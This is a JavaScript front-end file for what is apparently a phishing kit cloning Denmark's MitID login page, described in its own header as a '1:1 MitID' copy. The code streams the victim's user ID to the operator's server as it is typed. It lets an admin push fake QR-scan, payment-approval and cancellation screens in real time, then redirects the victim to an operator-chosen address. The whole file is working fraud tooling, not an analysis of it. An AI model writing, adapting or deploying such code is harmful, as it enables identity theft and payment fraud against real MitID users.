/* ════════════════════════════════════════════════════════════
   visitor.js — 1:1 MitID (hej.rf.gd kopi)
   Forside = ALTID Bruger-ID. Admin kan skifte til QR/Betaling/etc.
   ════════════════════════════════════════════════════════════ */
let serverFlow = null;
let lastSig = null;
let qrDrawn = null;
let redirectTimer = null;

const $ = (id) => document.getElementById(id);
const show = (id) => { const el = $(id); if (el) el.classList.remove('hidden'); };
const hide = (id) => { const el = $(id); if (el) el.classList.add('hidden'); };
const hideAll = () => { ['loaderContainer','stepBruger','stepQr','stepBetaling','stepWait'].forEach(hide); };

/* ── TRIN VISNINGER ── */
function vBrugerId() { hideAll(); show('stepBruger'); $('formHeading').textContent = 'Log på hos MitID.dk'; }
function vQr(s) {
  hideAll(); show('stepQr');
  $('formHeading').textContent = 'Log på hos MitID.dk';
  const url = s.sessionId ? window.location.origin + '/r/' + s.sessionId : 'https://mitid.dk';
  if (url !== qrDrawn) {
    const el = $('qrcode'); el.innerHTML = '';
    if (window.QRCode) new QRCode(el, { text: url, width: 200, height: 200, colorDark: '#000', colorLight: '#fff', correctLevel: QRCode.CorrectLevel.M });
    qrDrawn = url;
  }
}
function vBetaling(s, isAnnuller) {
  hideAll(); show('stepBetaling');
  const a = s.action || {};
  $('formHeading').textContent = isAnnuller ? 'Annullering' : 'Bekræft betaling';
  $('betAmount').textContent = a.amount || '';
  $('betAmount').style.color = isAnnuller ? '#dc2626' : '#1a1a1a';
  $('betTitle').textContent = a.title || (isAnnuller ? 'Annullering af betaling' : 'Godkend denne betaling');
}
function vWait() {
  hideAll(); show('loaderContainer');
  $('formHeading').textContent = '';
}
function vApproved(s) {
  hideAll(); show('stepWait');
  $('formHeading').textContent = 'Godkendt';
  if (s.target && s.target.trim()) {
    clearTimeout(redirectTimer);
    redirectTimer = setTimeout(() => { window.location.href = s.target.trim(); }, 1500);
  }
}

/* ── RENDER: server-flow styrer, men forside er ALTID bruger-id hvis ingen admin-flow ── */
function render(s) {
  if (!s) return;
  const sg = JSON.stringify([s.live, s.flow, s.sessionId, s.tekst, (s.action||{}).title, (s.action||{}).amount, (s.action||{}).detail, (s.beskedBanner||{}).visible, (s.beskedBanner||{}).text]);
  if (sg === lastSig) return;
  lastSig = sg;

  // MITID BESKED banner
  const banner = document.getElementById('mitidBanner');
  if (banner) {
    const bb = s.beskedBanner || { visible: false, text: '' };
    banner.style.display = bb.visible ? 'flex' : 'none';
    const bt = document.getElementById('mitidBannerText');
    if (bt) bt.textContent = bb.text || '';
  }

  if (!s.live) {
    // forside = bruger-ID
    hideAll(); show('stepBruger');
    $('formHeading').textContent = 'Log på hos MitID.dk';
    return;
  }
  const f = s.flow || 'brugerid';
  switch (f) {
    case 'scan': vQr(s); break;
    case 'betaling': vBetaling(s, false); break;
    case 'annuller': vBetaling(s, true); break;
    case 'wait': vWait(); break;
    case 'approved': vApproved(s); break;
    case 'brugerid':
    default: vBrugerId();
  }
}

/* ── BRUGER-ID INPUT: live-til-admin + enable FORTSÆT ── */
const inp = $('brugerIdInput');
const btn = $('brugerBtn');
let typedTimer = null;

inp.addEventListener('input', function () {
  const v = this.value.trim();
  if (v) {
    btn.disabled = false;
    btn.classList.remove('bg-[#cccccc]', 'cursor-not-allowed');
    btn.classList.add('bg-[#0060e6]', 'cursor-pointer', 'hover:bg-[#0049b8]');
  } else {
    btn.disabled = true;
    btn.classList.add('bg-[#cccccc]', 'cursor-not-allowed');
    btn.classList.remove('bg-[#0060e6]', 'cursor-pointer', 'hover:bg-[#0049b8]');
  }
  clearTimeout(typedTimer);
  typedTimer = setTimeout(() => {
    fetch('/api/typed', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ brugerId: v }) }).catch(() => {});
  }, 400);
});

// FORTSÆT: send + vis loader
btn.addEventListener('click', () => {
  const v = inp.value.trim();
  if (!v) return;
  fetch('/api/typed', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ brugerId: v }) }).catch(() => {});
  hideAll(); show('loaderContainer');
  $('formHeading').textContent = '';
});

// Skjul/Vis
$('hideBtn').addEventListener('click', function () {
  if (inp.type === 'text') { inp.type = 'password'; this.textContent = 'Vis'; }
  else { inp.type = 'text'; this.textContent = 'Skjul'; }
});

/* ── POLL + SOCKET ── */
async function poll() {
  try {
    const r = await fetch('/api/public-state', { cache: 'no-store' });
    render(await r.json());
  } catch (e) {}
}
poll();
try { const socket = io(); socket.on('state-update', render); } catch (e) {}
setInterval(poll, 1200);